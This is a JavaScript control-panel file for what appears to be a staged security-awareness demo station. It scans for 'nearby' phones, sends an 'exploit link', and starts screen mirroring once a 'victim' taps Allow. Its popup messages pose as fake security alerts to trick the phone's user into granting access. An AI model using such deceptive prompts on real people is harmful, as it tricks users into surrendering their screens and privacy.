/* ═══════════════════════════════════════════════════════
   control.js — Station 3 Radar Scanner & Screen Mirror
   ═══════════════════════════════════════════════════════ */

const socket = io();

// ── State ──────────────────────────────────────────────────────────────────
let phoneConnected = false;
let spamCount = 10;
let selectedDevice = null;
let streamActive = false;

// ── Utilities ──────────────────────────────────────────────────────────────
function log(msg, type = "info") {
  const el = document.getElementById("activityLog");
  if (!el) return;
  const ts = new Date().toLocaleTimeString("en-GB", { hour12: false });
  const div = document.createElement("div");
  div.className = `log-entry ${type}`;
  div.textContent = `[${ts}] ${msg}`;
  el.prepend(div);
  while (el.children.length > 80) el.removeChild(el.lastChild);
}

function showToast(msg, ms = 2500) {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.classList.add("show");
  setTimeout(() => el.classList.remove("show"), ms);
}

function copyPhoneUrl() {
  const url = document.getElementById("phoneUrlDisplay").textContent.trim();
  navigator.clipboard.writeText(url).then(() => showToast("📋 Exploit link copied!"));
}

// ── Target Selection & Instant Exploit Trigger ─────────────────────────────
function selectDevice(dev) {
  selectedDevice = dev;

  // Update target pill in attack panel
  document.getElementById("atpName").textContent = dev.hostname;
  document.getElementById("atpDist").textContent = `PROXIMITY: ${dev.distance}m AWAY (${dev.rssi || -30} dBm)`;
  document.getElementById("targetPanelTag").textContent = `TARGET: ${dev.hostname}`;
  document.getElementById("targetPanelTag").style.color = "var(--hot-red)";

  // Highlight card in list
  document.querySelectorAll(".device-card").forEach(c => c.classList.remove("targeted"));
  const clickedCard = document.getElementById(`dev-card-${dev.ip.replace(/[^a-zA-Z0-9]/g, '-')}`);
  if (clickedCard) clickedCard.classList.add("targeted");

  // Move radar blip to match target position
  const blip = document.getElementById("radarTargetBlip");
  if (blip) {
    blip.style.display = "block";
    blip.title = `${dev.hostname} (${dev.distance}m)`;
  }

  log(`Target selected: ${dev.hostname} (${dev.distance}m)`, "danger");
  showToast(`🎯 Locked on ${dev.hostname} (${dev.distance}m)`);

  // Instantly trigger spam blitz on click!
  launchSpam();
}

// ── Socket Events ──────────────────────────────────────────────────────────
socket.on("connect", () => {
  log("RF Proximity Scanner active", "info");
  startScan();
});

socket.on("phone_registered", (data) => {
  phoneConnected = true;
  const model = data.model || "Samsung Galaxy";
  document.getElementById("phoneStatusText").textContent = "TARGET LINKED";
  document.getElementById("pulseDot").classList.add("active");
  document.getElementById("liveTargetName").textContent = model.toUpperCase();
  document.getElementById("atpName").textContent = model;
  document.getElementById("atpDist").textContent = "PROXIMITY: 0.1m AWAY (IN HAND)";

  showToast(`📱 ${model} in range (0.1m)`);
  log(`Device registered: ${model} [0.1m]`, "success");

  // Update scanner list to highlight this connected phone
  startScan();
});

socket.on("phone_disconnected", () => {
  phoneConnected = false;
  document.getElementById("phoneStatusText").textContent = "SCANNING AREA";
  document.getElementById("pulseDot").classList.remove("active");
  showToast("📵 Target device disconnected");
  log("Device connection terminated", "danger");
  stopMirrorStream();
});

socket.on("victim_permitted", (data) => {
  // Victim tapped Allow on the popup -> Activate Screen Mirror!
  startMirrorStream(data);
});

socket.on("stream_action", (data) => {
  if (!streamActive) startMirrorStream();
  const actEl = document.getElementById("mirrorAction");
  if (actEl) actEl.textContent = data.action || "Screen Touched";
});

socket.on("phone_data", (payload) => {
  const d = payload.data;
  if (d.battery !== undefined && d.battery !== null) {
    const pct = Math.round(d.battery * 100);
    const bEl = document.getElementById("mirrorBattery");
    const lBat = document.getElementById("liveBatteryDisplay");
    if (bEl) bEl.textContent = `${pct}%`;
    if (lBat) lBat.textContent = `🔋 ${pct}%`;
  }
  if (d.orientation) {
    const { beta, gamma } = d.orientation;
    const tEl = document.getElementById("mirrorTilt");
    if (tEl) tEl.textContent = `${Math.round(beta || 0)}° / ${Math.round(gamma || 0)}°`;
  }
});

// ── Screen Mirror Control ──────────────────────────────────────────────────
function startMirrorStream(info) {
  streamActive = true;
  document.getElementById("viewLure").style.display = "none";
  document.getElementById("viewLive").style.display = "flex";
  document.getElementById("targetPanelTag").textContent = "LIVE SCREEN STREAM";
  document.getElementById("targetPanelTag").style.color = "var(--matrix)";

  // Trigger brief red flash on mirror screen
  const flash = document.getElementById("streamFlash");
  if (flash) {
    flash.classList.add("flash");
    setTimeout(() => flash.classList.remove("flash"), 400);
  }

  log("🎥 Screen mirror stream authorized & streaming!", "success");
  showToast("🎥 Target screen mirror active!");
}

function stopMirrorStream() {
  streamActive = false;
  document.getElementById("viewLure").style.display = "flex";
  document.getElementById("viewLive").style.display = "none";
  document.getElementById("targetPanelTag").textContent = "AWAITING CONNECTION";
  document.getElementById("targetPanelTag").style.color = "";
}

function requestScreenMirror() {
  socket.emit("spam_notifications", {
    count: 3,
    message: "ITC DEFENSE: Security Scan Verification Required. Tap ALLOW to authorize display stream."
  });
  showToast("🎥 Screen mirror prompt sent to target!");
  log("Prompting phone for display authorization", "info");
}

// ── Area Scanner ───────────────────────────────────────────────────────────
function startScan() {
  const btn = document.getElementById("scanBtn");
  const progress = document.getElementById("scanProgress");
  const fill = document.getElementById("scanFill");
  const list = document.getElementById("deviceList");
  const countEl = document.getElementById("deviceCount");

  btn.disabled = true;
  btn.innerHTML = '<span class="btn-icon">⟳</span> SCANNING...';
  progress.style.display = "block";
  fill.style.width = "20%";

  fetch("/api/scan")
    .then(r => r.json())
    .then(data => {
      fill.style.width = "100%";
      setTimeout(() => { progress.style.display = "none"; fill.style.width = "0%"; }, 400);
      countEl.textContent = `${data.total} DETECTED`;
      renderDevices(data.devices);
      btn.disabled = false;
      btn.innerHTML = '<span class="btn-icon">◉</span> RESCAN AREA';
    })
    .catch(err => {
      progress.style.display = "none";
      btn.disabled = false;
      btn.innerHTML = '<span class="btn-icon">◉</span> RESCAN AREA';
    });
}

function renderDevices(devices) {
  const list = document.getElementById("deviceList");
  list.innerHTML = "";

  devices.forEach((dev, i) => {
    const cardId = `dev-card-${dev.ip.replace(/[^a-zA-Z0-9]/g, '-')}`;
    const card = document.createElement("div");
    card.id = cardId;
    card.className = "device-card";

    const isTarget = dev.is_connected || (dev.distance <= 0.2 && dev.type === "phone");
    if (isTarget) card.classList.add("targeted");

    const dotColor = isTarget ? "var(--hot-red)" : dev.distance < 3 ? "var(--matrix)" : "var(--cyan)";
    const badgeText = isTarget ? "IN HAND (0.1m)" : `${dev.distance}m`;

    card.innerHTML = `
      <div class="device-dot" style="background:${dotColor};box-shadow:0 0 8px ${dotColor}"></div>
      <div class="device-info">
        <div class="device-hostname">📱 ${dev.hostname}</div>
        <div class="device-proximity-tag">PROXIMITY: ${dev.distance} METERS <span class="device-rssi">(${dev.rssi || -45} dBm)</span></div>
      </div>
      <div class="device-right">
        <div class="device-dist-pill" style="${isTarget ? 'background:rgba(216,30,36,0.2);color:var(--hot-red);border:1px solid rgba(216,30,36,0.4)' : ''}">
          ${badgeText}
        </div>
        <div class="device-online" style="font-size:0.42rem">${isTarget ? 'EXPLOITABLE' : 'IN RANGE'}</div>
      </div>
    `;

    card.addEventListener("click", () => selectDevice(dev));
    list.appendChild(card);
  });
}

// ── Attack Controls ────────────────────────────────────────────────────────
function adjustCount(d) {
  spamCount = Math.max(5, Math.min(50, spamCount + d));
  document.getElementById("spamCount").textContent = spamCount;
}

function launchSpam() {
  socket.emit("spam_notifications", {
    count: spamCount,
    message: "⚠️ SECURITY AUDIT: Unauthorized phone in 0.1m proximity! Tap ALLOW to clear security block."
  });
  log(`Spam barrage launched (${spamCount} popups)`, "danger");
  showToast(`⚡ Blasting ${spamCount} popups to phone!`);

  const btn = document.getElementById("btnSpam");
  btn.textContent = "⚡ ATTACK SENT!";
  setTimeout(() => { btn.textContent = "⚡ BLAST POPUPS NOW"; }, 2000);
}

function sendCustomMsg() {
  const text = document.getElementById("customMsg").value.trim();
  if (!text) return;
  socket.emit("send_message", { text });
  log(`Pushed alert: "${text}"`, "success");
  showToast("📩 Alert pushed to phone screen");
}

function sendVibrate(pattern) {
  socket.emit("trigger_vibrate", { pattern });
  log("Triggered remote vibration", "success");
  showToast("📳 Vibration pulse sent");
}

function clearLog() {
  document.getElementById("activityLog").innerHTML = "";
}

document.addEventListener("DOMContentLoaded", () => {
  log("Station 3 // RF Proximity & Mirror system initialized", "info");
  const msgInput = document.getElementById("customMsg");
  if (msgInput) msgInput.addEventListener("keypress", e => { if (e.key === "Enter") sendCustomMsg(); });
});
